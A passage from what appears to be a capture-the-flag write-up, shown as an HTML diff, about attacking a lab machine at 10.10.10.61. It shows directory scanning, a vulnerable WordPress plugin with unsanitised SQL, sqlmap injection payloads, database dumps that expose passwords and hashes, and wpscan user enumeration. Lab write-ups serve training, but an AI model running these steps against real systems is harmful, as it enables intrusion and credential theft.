+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">---- Entering directory: http://10.10.10.61/wp-content/ ----
+</span></span></span><span class="line"><span class="cl"><span class="go">+ http://10.10.10.61/wp-content/index.php (CODE:200|SIZE:0)                                                        
+</span></span></span><span class="line"><span class="cl"><span class="go">==&gt; DIRECTORY: http://10.10.10.61/wp-content/languages/                                                            
+</span></span></span><span class="line"><span class="cl"><span class="go">==&gt; DIRECTORY: http://10.10.10.61/wp-content/plugins/                                                              
+</span></span></span><span class="line"><span class="cl"><span class="go">==&gt; DIRECTORY: http://10.10.10.61/wp-content/themes/                                                               
+</span></span></span><span class="line"><span class="cl"><span class="go">==&gt; DIRECTORY: http://10.10.10.61/wp-content/upgrade/                                                              
+</span></span></span><span class="line"><span class="cl"><span class="go">==&gt; DIRECTORY: http://10.10.10.61/wp-content/uploads/                                                              
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">---- Entering directory: http://10.10.10.61/wp-includes/ ----
+</span></span></span><span class="line"><span class="cl"><span class="go">==&gt; DIRECTORY: http://10.10.10.61/wp-includes/certificates/                                                        
+</span></span></span><span class="line"><span class="cl"><span class="go">==&gt; DIRECTORY: http://10.10.10.61/wp-includes/css/                                                                 
+</span></span></span><span class="line"><span class="cl"><span class="go">==&gt; DIRECTORY: http://10.10.10.61/wp-includes/customize/                                                           
+</span></span></span><span class="line"><span class="cl"><span class="go">==&gt; DIRECTORY: http://10.10.10.61/wp-includes/fonts/                                                               
+</span></span></span><span class="line"><span class="cl"><span class="go">==&gt; DIRECTORY: http://10.10.10.61/wp-includes/images/
+</span></span></span></code></pre></div></div>
                                                          
 
 <h3 id="port-443">Port 443</h3>
 
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>dirb https://10.10.10.61/
-<span class="err">
-</span><span class="err"></span><span class="go">-----------------
-</span><span class="go">DIRB v2.22    
-</span><span class="go">By The Dark Raver
-</span><span class="go">-----------------
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">START_TIME: Thu Mar 15 12:13:24 2018
-</span><span class="go">URL_BASE: https://10.10.10.61/
-</span><span class="go">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">-----------------
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">GENERATED WORDS: 4612
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">---- Scanning URL: https://10.10.10.61/ ----
-</span><span class="go">==&gt; DIRECTORY: https://10.10.10.61/files/
-</span><span class="go">+ https://10.10.10.61/index.html (CODE:200|SIZE:10918)
-</span><span class="go">+ https://10.10.10.61/server-status (CODE:403|SIZE:300)
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">---- Entering directory: https://10.10.10.61/files/ ----
-</span><span class="go">(!) WARNING: Directory IS LISTABLE. No need to scan it.
-</span><span class="go">    (Use mode &#39;-w&#39; if you want to scan it anyway)
-</span></code></pre></div></div>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> dirb https://10.10.10.61/
+</span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">-----------------
+</span></span></span><span class="line"><span class="cl"><span class="go">DIRB v2.22    
+</span></span></span><span class="line"><span class="cl"><span class="go">By The Dark Raver
+</span></span></span><span class="line"><span class="cl"><span class="go">-----------------
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">START_TIME: Thu Mar 15 12:13:24 2018
+</span></span></span><span class="line"><span class="cl"><span class="go">URL_BASE: https://10.10.10.61/
+</span></span></span><span class="line"><span class="cl"><span class="go">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">-----------------
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">GENERATED WORDS: 4612
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">---- Scanning URL: https://10.10.10.61/ ----
+</span></span></span><span class="line"><span class="cl"><span class="go">==&gt; DIRECTORY: https://10.10.10.61/files/
+</span></span></span><span class="line"><span class="cl"><span class="go">+ https://10.10.10.61/index.html (CODE:200|SIZE:10918)
+</span></span></span><span class="line"><span class="cl"><span class="go">+ https://10.10.10.61/server-status (CODE:403|SIZE:300)
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">---- Entering directory: https://10.10.10.61/files/ ----
+</span></span></span><span class="line"><span class="cl"><span class="go">(!) WARNING: Directory IS LISTABLE. No need to scan it.
+</span></span></span><span class="line"><span class="cl"><span class="go">    (Use mode &#39;-w&#39; if you want to scan it anyway)
+</span></span></span></code></pre></div></div>
 
 <h3 id="port-8080">Port 8080</h3>
 
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>dirb http://10.10.10.61:8080/
-<span class="err">
-</span><span class="err"></span><span class="go">-----------------
-</span><span class="go">DIRB v2.22
-</span><span class="go">By The Dark Raver
-</span><span class="go">-----------------
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">START_TIME: Thu Mar 15 16:19:44 2018
-</span><span class="go">URL_BASE: http://10.10.10.61:8080/
-</span><span class="go">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">-----------------
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">GENERATED WORDS: 4612
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">---- Scanning URL: http://10.10.10.61:8080/ ----
-</span><span class="go">+ http://10.10.10.61:8080/0 (CODE:200|SIZE:7678)
-</span><span class="go">+ http://10.10.10.61:8080/01 (CODE:200|SIZE:8286)
-</span><span class="go">+ http://10.10.10.61:8080/02 (CODE:200|SIZE:8595)
-</span><span class="go">+ http://10.10.10.61:8080/1 (CODE:200|SIZE:8285)
-</span><span class="go">+ http://10.10.10.61:8080/1x1 (CODE:200|SIZE:8287)
-</span><span class="go">+ http://10.10.10.61:8080/2 (CODE:200|SIZE:8594)
-</span><span class="go">+ http://10.10.10.61:8080/2g (CODE:200|SIZE:8595)
-</span><span class="go">+ http://10.10.10.61:8080/about (CODE:200|SIZE:8160)
-</span><span class="go">+ http://10.10.10.61:8080/About (CODE:200|SIZE:8160)
-</span></code></pre></div></div>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> dirb http://10.10.10.61:8080/
+</span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">-----------------
+</span></span></span><span class="line"><span class="cl"><span class="go">DIRB v2.22
+</span></span></span><span class="line"><span class="cl"><span class="go">By The Dark Raver
+</span></span></span><span class="line"><span class="cl"><span class="go">-----------------
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">START_TIME: Thu Mar 15 16:19:44 2018
+</span></span></span><span class="line"><span class="cl"><span class="go">URL_BASE: http://10.10.10.61:8080/
+</span></span></span><span class="line"><span class="cl"><span class="go">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">-----------------
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">GENERATED WORDS: 4612
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">---- Scanning URL: http://10.10.10.61:8080/ ----
+</span></span></span><span class="line"><span class="cl"><span class="go">+ http://10.10.10.61:8080/0 (CODE:200|SIZE:7678)
+</span></span></span><span class="line"><span class="cl"><span class="go">+ http://10.10.10.61:8080/01 (CODE:200|SIZE:8286)
+</span></span></span><span class="line"><span class="cl"><span class="go">+ http://10.10.10.61:8080/02 (CODE:200|SIZE:8595)
+</span></span></span><span class="line"><span class="cl"><span class="go">+ http://10.10.10.61:8080/1 (CODE:200|SIZE:8285)
+</span></span></span><span class="line"><span class="cl"><span class="go">+ http://10.10.10.61:8080/1x1 (CODE:200|SIZE:8287)
+</span></span></span><span class="line"><span class="cl"><span class="go">+ http://10.10.10.61:8080/2 (CODE:200|SIZE:8594)
+</span></span></span><span class="line"><span class="cl"><span class="go">+ http://10.10.10.61:8080/2g (CODE:200|SIZE:8595)
+</span></span></span><span class="line"><span class="cl"><span class="go">+ http://10.10.10.61:8080/about (CODE:200|SIZE:8160)
+</span></span></span><span class="line"><span class="cl"><span class="go">+ http://10.10.10.61:8080/About (CODE:200|SIZE:8160)
+</span></span></span></code></pre></div></div>
 
 <p>If we visit <a href="https://10.10.10.61/files/" target="_blank">https://10.10.10.61/files/</a> we discover an archive lcars.zip which contains 3 files:
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">501 Oct 17 04:25 lcars_db.php
-624 Oct 17 04:32 lcars_dbpost.php
-377 Oct 17 07:53 lcars.php</code></pre></div></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">501 Oct 17 04:25 lcars_db.php
+</span></span><span class="line"><span class="cl">624 Oct 17 04:32 lcars_dbpost.php
+</span></span><span class="line"><span class="cl">377 Oct 17 07:53 lcars.php</span></span></code></pre></div></p>
 
 <p>If we look inside lcars.php we see some info:
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">...
-Plugin Name: lcars
-...</code></pre></div></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">Plugin Name: lcars
+</span></span><span class="line"><span class="cl">...</span></span></code></pre></div></p>
 
 <p>So, maybe there is installed a wordpress plugin named lcars&hellip; Interesting. Let&rsquo;s have a look inside lcars_db.php:
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
-<span class="k">include</span> <span class="s2">&#34;/var/www/html/wp-config.php&#34;</span><span class="p">;</span>
-<span class="nv">$db</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">mysqli</span><span class="p">(</span><span class="nx">DB_HOST</span><span class="p">,</span> <span class="nx">DB_USER</span><span class="p">,</span> <span class="nx">DB_PASSWORD</span><span class="p">,</span> <span class="nx">DB_NAME</span><span class="p">);</span>
-<span class="c1">// Test the connection:
-</span><span class="c1"></span><span class="k">if</span> <span class="p">(</span><span class="nx">mysqli_connect_errno</span><span class="p">()){</span>
-    <span class="c1">// Connection Error
-</span><span class="c1"></span>    <span class="k">exit</span><span class="p">(</span><span class="s2">&#34;Couldn&#39;t connect to the database: &#34;</span><span class="o">.</span><span class="nx">mysqli_connect_error</span><span class="p">());</span>
-<span class="p">}</span>
-
-<span class="c1">// test to retireve an ID
-</span><span class="c1"></span><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;query&#39;</span><span class="p">])){</span>
-    <span class="nv">$query</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;query&#39;</span><span class="p">];</span>
-    <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;SELECT ID FROM wp_posts WHERE post_name = </span><span class="si">$query</span><span class="s2">&#34;</span><span class="p">;</span>
-    <span class="nv">$result</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
-    <span class="k">echo</span> <span class="nv">$result</span><span class="p">;</span>
-<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
-    <span class="k">echo</span> <span class="s2">&#34;Failed to read query&#34;</span><span class="p">;</span>
-<span class="p">}</span>
-<span class="cp">?&gt;</span><span class="err">
-</span></code></pre></div></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">include</span> <span class="s2">&#34;/var/www/html/wp-config.php&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$db</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">mysqli</span><span class="p">(</span><span class="nx">DB_HOST</span><span class="p">,</span> <span class="nx">DB_USER</span><span class="p">,</span> <span class="nx">DB_PASSWORD</span><span class="p">,</span> <span class="nx">DB_NAME</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// Test the connection:
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span> <span class="p">(</span><span class="nx">mysqli_connect_errno</span><span class="p">()){</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// Connection Error
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">exit</span><span class="p">(</span><span class="s2">&#34;Couldn&#39;t connect to the database: &#34;</span><span class="o">.</span><span class="nx">mysqli_connect_error</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// test to retireve an ID
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;query&#39;</span><span class="p">])){</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$query</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;query&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;SELECT ID FROM wp_posts WHERE post_name = </span><span class="si">$query</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$result</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="nv">$result</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;Failed to read query&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div></p>
 
 <p>Nice. I think this code begs for an SQL injection&hellip;</p>
 
 <h1 id="sql-injection">SQL Injection</h1>
 
 <p>Let&rsquo;s use sqlmap to exploit this SQLI:
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>sqlmap -u <span class="s2">&#34;http://10.10.10.61/wp-content/plugins/lcars/lcars_db.php?query=22&#34;</span> --dbms<span class="o">=</span>mysql
-<span class="err">
-</span><span class="err"></span><span class="go">sqlmap identified the following injection point(s) with a total of 40 HTTP(s) requests:
-</span><span class="go">---
-</span><span class="go">Parameter: query (GET)
-</span><span class="go">    Type: boolean-based blind
-</span><span class="go">    Title: MySQL &gt;= 5.0 boolean-based blind - Parameter replace
-</span><span class="go">    Payload: query=(SELECT (CASE WHEN (3344=3344) THEN 3344 ELSE 3344*(SELECT 3344 FROM INFORMATION_SCHEMA.PLUGINS) END))
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">    Type: error-based
-</span><span class="go">    Title: MySQL &gt;= 5.0 error-based - Parameter replace (FLOOR)
-</span><span class="go">    Payload: query=(SELECT 3017 FROM(SELECT COUNT(*),CONCAT(0x716b6a7871,(SELECT (ELT(3017=3017,1))),0x716b717871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
-</span><span class="go">---
-</span></code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> sqlmap -u <span class="s2">&#34;http://10.10.10.61/wp-content/plugins/lcars/lcars_db.php?query=22&#34;</span> --dbms<span class="o">=</span>mysql
+</span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">sqlmap identified the following injection point(s) with a total of 40 HTTP(s) requests:
+</span></span></span><span class="line"><span class="cl"><span class="go">---
+</span></span></span><span class="line"><span class="cl"><span class="go">Parameter: query (GET)
+</span></span></span><span class="line"><span class="cl"><span class="go">    Type: boolean-based blind
+</span></span></span><span class="line"><span class="cl"><span class="go">    Title: MySQL &gt;= 5.0 boolean-based blind - Parameter replace
+</span></span></span><span class="line"><span class="cl"><span class="go">    Payload: query=(SELECT (CASE WHEN (3344=3344) THEN 3344 ELSE 3344*(SELECT 3344 FROM INFORMATION_SCHEMA.PLUGINS) END))
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">    Type: error-based
+</span></span></span><span class="line"><span class="cl"><span class="go">    Title: MySQL &gt;= 5.0 error-based - Parameter replace (FLOOR)
+</span></span></span><span class="line"><span class="cl"><span class="go">    Payload: query=(SELECT 3017 FROM(SELECT COUNT(*),CONCAT(0x716b6a7871,(SELECT (ELT(3017=3017,1))),0x716b717871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+</span></span></span><span class="line"><span class="cl"><span class="go">---
+</span></span></span></code></pre></div></div></p>
 
 <p>Let&rsquo;s see what databases we have:
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>sqlmap -u <span class="s2">&#34;http://10.10.10.61/wp-content/plugins/lcars/lcars_db.php?query=22&#34;</span> --dbms<span class="o">=</span>mysql --dbs
-<span class="err">
-</span><span class="err"></span><span class="go">web server operating system: Linux Debian 8.0 (jessie)
-</span><span class="go">web application technology: PHP 5.6.31, Apache 2.4.10
-</span><span class="go">back-end DBMS: MySQL &gt;= 5.0.0
-</span><span class="go">available databases [8]:
-</span><span class="go">[*] information_schema
-</span><span class="go">[*] joomla
-</span><span class="go">[*] joomladb
-</span><span class="go">[*] mysql
-</span><span class="go">[*] performance_schema
-</span><span class="go">[*] sys
-</span><span class="go">[*] wordpress
-</span><span class="go">[*] wordpressdb
-</span></code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> sqlmap -u <span class="s2">&#34;http://10.10.10.61/wp-content/plugins/lcars/lcars_db.php?query=22&#34;</span> --dbms<span class="o">=</span>mysql --dbs
+</span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">web server operating system: Linux Debian 8.0 (jessie)
+</span></span></span><span class="line"><span class="cl"><span class="go">web application technology: PHP 5.6.31, Apache 2.4.10
+</span></span></span><span class="line"><span class="cl"><span class="go">back-end DBMS: MySQL &gt;= 5.0.0
+</span></span></span><span class="line"><span class="cl"><span class="go">available databases [8]:
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] information_schema
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] joomla
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] joomladb
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] mysql
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] performance_schema
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] sys
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] wordpress
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] wordpressdb
+</span></span></span></code></pre></div></div></p>
 
 <h2 id="dumping-the-wordpress-database">Dumping the wordpress database</h2>
 
 <p>Let&rsquo;s dump the wordpress database:
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>sqlmap -u <span class="s2">&#34;http://10.10.10.61/wp-content/plugins/lcars/lcars_db.php?query=22&#34;</span> --dbms<span class="o">=</span>mysql -D wordpress --dump
-<span class="err">
-</span><span class="err"></span><span class="go">...
-</span><span class="go">wp_posts
-</span><span class="go">--------
-</span><span class="go">ID,guid,pinged,to_ping,post_date,post_type,post_name,menu_order,post_title,post_status,post_parent,ping_status,post_author,post_content,post_excerpt,post_date_gmt,post_modified,comment_count,post_password,post_mime_type,comment_status,post_modified_gmt,post_content_filtered
-</span><span class="go">6,http://10.10.10.61/?p=66,&lt;blank&gt;,&lt;blank&gt;,2017-09-06 15:40:30,post,&lt;blank&gt;,0,Passwords,draft,0,open,1,Needed somewhere to put some passwords quickly\r\n\r\nZxJyhGem4k338S2Y\r\n\r\nenterprisencc170\r\n\r\nZD3YxfnSjezg67JZ\r\n\r\nu*Z14ru0p#ttj83zS6\r\n\r\n \r\n\r\n ,&lt;blank&gt;,0000-00-00 00:00:00,2017-09-06 15:40:30,0,&lt;blank&gt;,&lt;blank&gt;,open,2017-09-06 14:40:30,&lt;blank&gt;
-</span><span class="go">67,http://10.10.10.61/?p=67,&lt;blank&gt;,&lt;blank&gt;,2017-09-06 
-</span><span class="go">...
-</span></code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> sqlmap -u <span class="s2">&#34;http://10.10.10.61/wp-content/plugins/lcars/lcars_db.php?query=22&#34;</span> --dbms<span class="o">=</span>mysql -D wordpress --dump
+</span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">...
+</span></span></span><span class="line"><span class="cl"><span class="go">wp_posts
+</span></span></span><span class="line"><span class="cl"><span class="go">--------
+</span></span></span><span class="line"><span class="cl"><span class="go">ID,guid,pinged,to_ping,post_date,post_type,post_name,menu_order,post_title,post_status,post_parent,ping_status,post_author,post_content,post_excerpt,post_date_gmt,post_modified,comment_count,post_password,post_mime_type,comment_status,post_modified_gmt,post_content_filtered
+</span></span></span><span class="line"><span class="cl"><span class="go">6,http://10.10.10.61/?p=66,&lt;blank&gt;,&lt;blank&gt;,2017-09-06 15:40:30,post,&lt;blank&gt;,0,Passwords,draft,0,open,1,Needed somewhere to put some passwords quickly\r\n\r\nZxJyhGem4k338S2Y\r\n\r\nenterprisencc170\r\n\r\nZD3YxfnSjezg67JZ\r\n\r\nu*Z14ru0p#ttj83zS6\r\n\r\n \r\n\r\n ,&lt;blank&gt;,0000-00-00 00:00:00,2017-09-06 15:40:30,0,&lt;blank&gt;,&lt;blank&gt;,open,2017-09-06 14:40:30,&lt;blank&gt;
+</span></span></span><span class="line"><span class="cl"><span class="go">67,http://10.10.10.61/?p=67,&lt;blank&gt;,&lt;blank&gt;,2017-09-06 
+</span></span></span><span class="line"><span class="cl"><span class="go">...
+</span></span></span></code></pre></div></div></p>
 
 <p>Nice, we have found some passwords: Passwords: ZxJyhGem4k338S2Y, enterprisencc170, ZD3YxfnSjezg67JZ, u*Z14ru0p#ttj83zS6. But we lack a username. Let&rsquo;s use wpscan to enumerate users:
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>wpscan --url http://10.10.10.61/wp-content -e u
-<span class="err">
-</span><span class="err"></span><span class="go">...
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">[i] User(s) Identified:
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">[+] william.riker
-</span><span class="go"> | Detected By: Author Posts - Display Name (Passive Detection)
-</span><span class="go"> | Confirmed By: Login Error Messages (Aggressive Detection)
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">[+] william-riker
-</span><span class="go"> | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">...
-</span></code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> wpscan --url http://10.10.10.61/wp-content -e u
+</span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">...
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[i] User(s) Identified:
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[+] william.riker
+</span></span></span><span class="line"><span class="cl"><span class="go"> | Detected By: Author Posts - Display Name (Passive Detection)
+</span></span></span><span class="line"><span class="cl"><span class="go"> | Confirmed By: Login Error Messages (Aggressive Detection)
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[+] william-riker
+</span></span></span><span class="line"><span class="cl"><span class="go"> | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">...
+</span></span></span></code></pre></div></div></p>
 
 <p>If we do some tests, we will see that the credentials william.riker:u*Z14ru0p#ttj83zS6 are working for <a href="http://10.10.10.61/wp-login.php" target="_blank">http://10.10.10.61/wp-login.php</a></p>
 
 <h2 id="dumping-the-joomladb-database">Dumping the joomladb database</h2>
 
 <p>Now let&rsquo;s dump the joomladb database:
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>sqlmap -u <span class="s2">&#34;http://10.10.10.61/wp-content/plugins/lcars/lcars_db.php?query=22&#34;</span> --dbms<span class="o">=</span>mysql -D joomladb --dump
-<span class="err">
-</span><span class="err"></span><span class="go">edz2g_users
-</span><span class="go">-----------
-</span><span class="go">id,name,otep,email,block,otpKey,params,username,password,sendEmail,activation,resetCount,registerDate,requireReset,lastResetTime,lastvisitDate
-</span><span class="go">400,Super User,&lt;blank&gt;,geordi.la.forge@10.10.10.61,0,&lt;blank&gt;,&#34;{&#34;&#34;admin_style&#34;&#34;:&#34;&#34;&#34;&#34;,&#34;&#34;admin_language&#34;&#34;:&#34;&#34;&#34;&#34;,&#34;&#34;language&#34;&#34;:&#34;&#34;&#34;&#34;,&#34;&#34;editor&#34;&#34;:&#34;&#34;&#34;&#34;,&#34;&#34;helpsite&#34;&#34;:&#34;&#34;&#34;&#34;,&#34;&#34;timezone&#34;&#34;:&#34;&#34;&#34;&#34;}&#34;,geordi.la.forge,$2y$10$cXSgEkNQGBBUneDKXq9gU.8RAf37GyN7JIrPE7us9UBMR9uDDKaWy,1,0,0,2017-09-03 19:30:04,0,0000-00-00 00:00:00,2017-10-30 13:59:06
-</span><span class="go">401,Guinan,&lt;blank&gt;,guinan@10.10.10.61,0,&lt;blank&gt;,&#34;{&#34;&#34;admin_style&#34;&#34;:&#34;&#34;&#34;&#34;,&#34;&#34;admin_language&#34;&#34;:&#34;&#34;&#34;&#34;,&#34;&#34;language&#34;&#34;:&#34;&#34;&#34;&#34;,&#34;&#34;editor&#34;&#34;:&#34;&#34;&#34;&#34;,&#34;&#34;helpsite&#34;&#34;:&#34;&#34;&#34;&#34;,&#34;&#34;timezone&#34;&#34;:&#34;&#34;&#34;&#34;}&#34;,Guinan,$2y$10$90gyQVv7oL6CCN8lF/0LYulrjKRExceg2i0147/Ewpb6tBzHaqL2q,0,&lt;blank&gt;,0,2017-09-06 12:38:03,0,0000-00-00 00:00:00,0000-00-00 00:00:00
-</span></code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> sqlmap -u <span class="s2">&#34;http://10.10.10.61/wp-content/plugins/lcars/lcars_db.php?query=22&#34;</span> --dbms<span class="o">=</span>mysql -D joomladb --dump
+</span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">edz2g_users
+</span></span></span><span class="line"><span class="cl"><span class="go">-----------
+</span></span></span><span class="line"><span class="cl"><span class="go">id,name,otep,email,block,otpKey,params,username,password,sendEmail,activation,resetCount,registerDate,requireReset,lastResetTime,lastvisitDate
